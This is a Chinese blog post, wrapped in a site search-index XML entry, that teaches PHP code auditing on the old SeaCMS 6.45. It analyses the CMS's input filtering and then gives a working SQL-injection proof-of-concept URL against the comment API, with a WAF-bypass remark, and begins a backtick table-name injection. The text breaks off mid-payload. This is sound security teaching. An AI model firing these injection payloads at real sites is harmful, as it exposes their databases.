<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>通过 SeaCMS 学习 php 代码审计</title>
    <link href="/2021/09/11/seacms/"/>
    <url>/2021/09/11/seacms/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>SeaCMS 是一套专为不同需求的站长而设计的视频点播系统，也曾爆出过很多经典的漏洞，现在仍在维护，最新版本是 v12.x</p><p>本次代码审计选择的版本是 SeaCMS 6.45，活跃时间大概在2015年，因为这个版本存在很多有趣的漏洞，十分适合我们练手</p><h1 id="0x02-全局分析"><a href="#0x02-全局分析" class="headerlink" title="0x02 全局分析"></a>0x02 全局分析</h1><h2 id="网站首页-index-php"><a href="#网站首页-index-php" class="headerlink" title="网站首页 index.php"></a>网站首页 index.php</h2><blockquote><p>index.php</p></blockquote><p>SeaCMS 和 BlueCMS 的网站首页差不多，加载其他文件处理关键逻辑，然后借助模板输出网页视图。SeaCMS 并没有采用Smarty模板引擎处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> (<span class="hljs-string">&quot;include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span> sea_INC.<span class="hljs-string">&quot;/main.class.php&quot;</span>;<br><span class="hljs-comment">// 输出首页页面</span><br>echoIndex();<br></code></pre></td></tr></table></figure><h2 id="common-php"><a href="#common-php" class="headerlink" title="common.php"></a>common.php</h2><blockquote><p>include/common.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件，360webscan.php具有一些安全过滤，mysql.php定义了数据库操控函数，common.func.php含有大量基础函数</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="hljs-string">&#x27;/360safe/360webscan.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>( sea_INC.<span class="hljs-string">&#x27;/inc/mysql.php&#x27;</span> );<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/common.func.php&#x27;</span>);<br><span class="hljs-comment">//检查和注册外部提交的GPC变量是否为系统的全局或配置变量</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span>=&gt;<span class="hljs-variable">$_v</span>)<br>&#123;<br><span class="hljs-keyword">if</span>( strlen(<span class="hljs-variable">$_k</span>)&gt;<span class="hljs-number">0</span> &amp;&amp; m_eregi(<span class="hljs-string">&#x27;^(cfg_|GLOBALS)&#x27;</span>,<span class="hljs-variable">$_k</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-variable">$_k</span>]) )<br>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow!&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">// 过滤GPC数据，_RunMagicQuotes底层是addslashes()实现</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>&#125;<br><span class="hljs-comment">//加载配置文件，主要为数据库配置文件和系统配置参数，这里就是 cfg_ 变量</span><br><span class="hljs-keyword">require_once</span>(sea_DATA.<span class="hljs-string">&#x27;/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(sea_DATA.<span class="hljs-string">&quot;/config.cache.inc.php&quot;</span>);<br><span class="hljs-comment">//模板的存放目录</span><br><span class="hljs-variable">$cfg_templets_dir</span> = <span class="hljs-string">&#x27;templets&#x27;</span>;<br><span class="hljs-comment">// 文件上传安全处理</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)<br>&#123;<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//引入数据库类 sql.class.php 会实例化 $db/$dsql 数据库链接对象，$db-&gt;linkID保存着数据库连接</span><br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&#x27;/sql.class.php&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li><p>重点关注common.php 对变量的处理，首先程序禁止GPC变量为系统的全局变量或 <code>cfg_</code> 配置变量，然后全局对GPC数据做addslashes()过滤，没有过滤 <code>$_SERVER</code> 。注意这里通过 <code>$$</code> 的方式直接把GPC的变量注册到系统中，可能会造成变量覆盖漏洞的问题</p></li><li><p>加载的 common.func.php 含有大量的基础函数，其中还有 RemoveXSS() 这种方法过滤 xss 代码，需要调用才能实现</p></li><li><p>注意到SeaCMS 对文件上传也有全局处理，跟踪下这个文件 include/uploadsafe.inc.php</p><p>这里通过黑名单方式禁用了很多以文件后缀，如果服务器只解析 php 后缀的文件，我们则很难绕过这个</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cfg_not_allowall</span> = <span class="hljs-string">&quot;php|pl|cgi|asp|asa|cer|aspx|jsp|php3|shtm|shtml&quot;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span>=&gt;<span class="hljs-variable">$_value</span>)<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (m_eregi(<span class="hljs-string">&quot;\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !m_ereg(<span class="hljs-string">&quot;\.&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )<br>    &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="后台入口-index-php"><a href="#后台入口-index-php" class="headerlink" title="后台入口 index.php"></a>后台入口 index.php</h2><p>前台的功能点一般比较少，很多时候需要通过后台的功能点才能获取到shell，bluecms就是通过后台获取的shell。下面分析一下后台入口文件 index.php 的流程</p><blockquote><p>admin/index.php</p></blockquote><p>下面是 admin/index.php 的全部代码，写的十分简单，可以看到具体逻辑还是交给了加载的文件，我们还需要分析加载的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// config.php 会加载common.php对外部数据做全局过滤，还会加载check.admin.php做身份验证，是后台的核心文件</span><br><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br><span class="hljs-comment">// inc_menu.php 存有后台菜单的大量信息，将会在index.htm中显示</span><br><span class="hljs-keyword">require_once</span>(sea_ADMIN.<span class="hljs-string">&#x27;/inc_menu.php&#x27;</span>);<br><span class="hljs-variable">$defaultIcoFile</span> = sea_ROOT.<span class="hljs-string">&#x27;/data/admin/quickmenu.txt&#x27;</span>;<br><span class="hljs-variable">$myIcoFile</span> = sea_ROOT.<span class="hljs-string">&#x27;/data/admin/quickmenu-&#x27;</span>.<span class="hljs-variable">$cuserLogin</span>-&gt;getUserID().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$myIcoFile</span>)) &#123;<br><span class="hljs-variable">$myIcoFile</span> = <span class="hljs-variable">$defaultIcoFile</span>;<br>&#125;<br><span class="hljs-comment">// 后台的视图输出都在该模板中</span><br><span class="hljs-keyword">include</span>(sea_ADMIN.<span class="hljs-string">&#x27;/templets/index.htm&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="admin-config-php"><a href="#admin-config-php" class="headerlink" title="admin/config.php"></a>admin/config.php</h3><blockquote><p>admin/config.php</p></blockquote><ul><li>加载了和首页index.php相同的common.php，这里能知道 BlueCMS 后台也做了全局安全过滤和其他的操作</li><li>加载了check.admin.php，该类定义了userLogin类，用于用户的身份认证，所以加载了 config.php 的文件基本可以认定是需要登陆后台。SeaCMS 主要通过session来认证用户身份，没有通过认证的将会跳转到登陆页面。因为我没有看出SeaCMS的认证缺陷，这里就不多分析具体的逻辑了</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载基础文件</span><br><span class="hljs-keyword">require_once</span>(sea_ADMIN.<span class="hljs-string">&quot;/../include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&quot;/check.admin.php&quot;</span>);<br><span class="hljs-comment">//检验用户登录状态</span><br><span class="hljs-variable">$cuserLogin</span> = <span class="hljs-keyword">new</span> userLogin();<br><span class="hljs-variable">$hashstr</span>=md5(<span class="hljs-variable">$cfg_dbpwd</span>.<span class="hljs-variable">$cfg_dbname</span>.<span class="hljs-variable">$cfg_dbuser</span>);<span class="hljs-comment">//构造session安全码</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cuserLogin</span>-&gt;getUserID()==-<span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hashstr&#x27;</span>] !== <span class="hljs-variable">$hashstr</span>)<br>&#123;<br>header(<span class="hljs-string">&quot;location:login.php?gotopage=&quot;</span>.urlencode(<span class="hljs-variable">$EkNowurl</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-comment">// 定义很多的方法</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeTopicSelect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"><span class="hljs-title">function</span> <span class="hljs-title">getTemplateType</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  ……</span><br></code></pre></td></tr></table></figure><h3 id="后台页面的视图"><a href="#后台页面的视图" class="headerlink" title="后台页面的视图"></a>后台页面的视图</h3><blockquote><p>admin/templets/index.htm</p></blockquote><p>SeaCMS 也有用到 iframe 让 index.php 可以成为入口文件，和BlueCMS不同的是，SeaCMS在菜单栏上并没有使用iframe，而是使用大量php代码+HTML代码来实现，看起来十分困难</p><p>从这里也能感受到早期CMS在视图呈现上的常用方式，它们通常在php代码中保存要输出的信息，然后通过加载一个htm的静态页面，在静态页面中穿插部分php代码，从而呈现出视图。看到这也不免期待使用 MVC 架构的程序实现视图的方案</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;90&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span><br>            # 包括logo，pannel，nav等，其中nav为上部菜单(导航栏)，主要显示inc_menu.php中的数据<br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>#左部菜单和footer，主要显示inc_menu.php中的数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">valign</span>=<span class="hljs-string">&quot;top&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;maincontent&quot;</span>&gt;</span>#主题内容通过iframe实现<br>            <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index_body.php&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;I2&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;yes&quot;</span></span><br><span class="hljs-tag">                    <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;overflow: visible;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x03-挖洞记录"><a href="#0x03-挖洞记录" class="headerlink" title="0x03 挖洞记录"></a>0x03 挖洞记录</h1><p>Seacms 前台除了有一个代码执行的漏洞，没有发现其他什么漏洞，大多数漏洞都在后台。因为前台的代码执行漏洞有点复杂，我放到最后解析</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h3><blockquote><p>comment/api/index.php</p></blockquote><p>这个前台sql注入稍微有点复杂，但代码审计的关键是一击致命，下面放出一眼应该看出存在漏洞的两行代码:</p><p>我们知道addslashs()主要是过滤引号的sql注入，其中<code>$type</code>, <code>$ids</code>并没有被引号包裹，如果我们找出这两个参数可控，那么这个sql注入就可利用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="hljs-subst">$type</span> AND id in (<span class="hljs-subst">$ids</span>) ORDER BY id DESC&quot;</span>;<br>    <span class="hljs-variable">$dsql</span>-&gt;setQuery(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>然后再细看代码：</p><ul><li><code>$type</code>  默认为1，而且会经过 is_numeric() 数字类参数的判断，故该参数不能利用，同样的<code>$id</code>，<code>$page</code>也只能控制为数字类的参数</li><li><code>$page&lt;2</code> 可能会提前退出程序，所以最好控制 <strong>$page&gt;=2</strong></li><li>最后最执行ReadData()函数，跟进该函数，当 <strong>$id&gt;0</strong>（来自$gid）时会调用Readmlist(), Readrlist()</li><li>传入 Readrlist() 的参数来自 <code>$ids = $x = implode(&#39;,&#39;,$rlist)</code>，即 <code>$rlist</code>，该参数可控，implode()是把数组参数转换为字符串， 所以 <code>$ids</code> 可控，那么上面的代码漏洞存在</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;../../include/common.php&quot;</span>);<br><span class="hljs-variable">$id</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$gid</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$gid</span>)) ? <span class="hljs-variable">$gid</span> : <span class="hljs-number">0</span>;<br><span class="hljs-variable">$page</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$page</span>)) ? <span class="hljs-variable">$page</span> : <span class="hljs-number">1</span>;<br><span class="hljs-variable">$type</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$type</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$type</span>)) ? <span class="hljs-variable">$type</span> : <span class="hljs-number">1</span>;<br><span class="hljs-comment">//缓存第一页的评论</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span>&lt;<span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$jsoncachefile</span>))<br>&#123;<br><span class="hljs-variable">$json</span>=LoadFile(<span class="hljs-variable">$jsoncachefile</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$json</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$h</span> = ReadData(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span>);<br>……<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ReadData</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$type</span>,<span class="hljs-variable">$pCount</span>,<span class="hljs-variable">$rlist</span>;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$page</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-variable">$type</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span>&gt;<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-number">0</span>] = Readmlist(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$ret</span>[<span class="hljs-number">4</span>]);<br><span class="hljs-variable">$ret</span>[<span class="hljs-number">3</span>] = <span class="hljs-variable">$pCount</span>;<br>    <span class="hljs-comment">// $x来自$rlist，然后传入Readrlist()</span><br><span class="hljs-variable">$x</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$rlist</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$x</span>))<br>&#123;<br><span class="hljs-variable">$ret</span>[<span class="hljs-number">1</span>] = Readrlist(<span class="hljs-variable">$x</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$readData</span> = FormatJson(<span class="hljs-variable">$ret</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$readData</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Readrlist</span>(<span class="hljs-params"><span class="hljs-variable">$ids</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$size</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$dsql</span>,<span class="hljs-variable">$type</span>;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="hljs-subst">$type</span> AND id in (<span class="hljs-subst">$ids</span>) ORDER BY id DESC&quot;</span>;<br>    <span class="hljs-variable">$dsql</span>-&gt;setQuery(<span class="hljs-variable">$sql</span>);<br>  ……<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们就需要构造一个poc，上面我们知道，需要的条件有：1、**$page&gt;=2** ；2、**$gid&gt;0<strong>；3、</strong>$rlist** 为数组</p><p>最终构造的POC：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://seacms.test:8888/comment/api/index.php?gid=1&amp;page=2&amp;rlist</span>[<span class="hljs-string"></span>]=extractvalue(1,concat_ws(0x7e,user(),database()))<br></code></pre></td></tr></table></figure><p>注意绕过SeaCMS内置的waf</p><img src="img/seacms/image-20210810185247600.png" alt="image-20210810185247600" style="zoom:50%;" /><p>像这种漏洞通过黑盒测试是很难测出来的，如果通过代码审计找到这个漏洞就会比较有成就感</p><h3 id="后台反引号sql注入"><a href="#后台反引号sql注入" class="headerlink" title="后台反引号sql注入"></a>后台反引号sql注入</h3><blockquote><p>admin/admin_database.php</p></blockquote><p>这是一个很典型的sql注入漏洞，使用 addslashes() 只能过滤掉单引号的注入，使用反引号包裹变量可以绕过，反引号一般用于包裹表名，可以利用下面的正则全局搜索一下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">`<span class="hljs-selector-attr">[$]</span><span class="hljs-selector-attr">[A-Za-z0-9_]</span>*`<br></code></pre></td></tr></table></figure><p>便可以找到 admin_database.php 存在这样的代码：</p><ul><li><p>admin_database.php 加载了 config.php，就会对GPC数据过滤并注册、验证登陆状态</p></li><li><p>通过控制 <code>$action==&quot;bak&quot;</code>，<code>$nowtable</code>不为空，就可以成功执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">From</span> `$nowtable`<br></code></pre></td></tr></table></figure><p>而 <code>$nowtable</code> 不为空且可控，可以通过该值传入sql语句。这里就是常见的反引号包裹表名绕过单引号过滤导致的SQL注入</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br>……<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&quot;bak&quot;</span>)<br>&#123;<br>  <span class="hljs-variable">$tables</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$tablearr</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tablearr</span>))<br>&#123;<br>ShowMsg(<span class="hljs-string">&#x27;你没选中任何表！&#x27;</span>,<span class="hljs-string">&#x27;admin_database.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$nowtable</span>==<span class="hljs-string">&#x27;&#x27;</span>)<br>  &#123;<br>    ……<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-variable">$dsql</span>-&gt;SetQuery(<span class="hljs-string">&quot;Select * From `<span class="hljs-subst">$nowtable</span>` &quot;</span>);<br><span class="hljs-variable">$dsql</span>-&gt;Execute();<br>  &#125;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row2</span> = <span class="hljs-variable">$dsql</span>-&gt;GetArray())<br>&#123;<br>    <br>  &#125;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$tables</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>]==<span class="hljs-variable">$nowtable</span>)<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]))<br>&#123;<br><span class="hljs-variable">$nowtable</span> = <span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>];<br><span class="hljs-variable">$startpos</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<span class="hljs-keyword">else</span><br>&#123;<br>PutInfo(<span class="hljs-string">&quot;完成所有数据备份！&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>header(<span class="hljs-string">&#x27;Location:admin_database.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br>&#125;<br>&#125;<br>  <span class="hljs-variable">$doneForm</span>=<span class="hljs-string">&quot;&lt;form name=&#x27;gonext&#x27; method=&#x27;post&#x27; action=&#x27;admin_database.php?action=bak&#x27;&gt;&quot;</span><br>    <span class="hljs-comment">//…… 一直跳转备份</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但我这里遇到两个小问题：</p><p>1）构造sql报错语句</p><p>该处为闭合表名注入sql语句，最好的方式是构造报错语句。一般遇到的sql注入都是在where处，此处sql注入位于表名，最好注入where语句，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `sea_admin` <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>extractvalue(<span class="hljs-number">1</span>,concat(<span 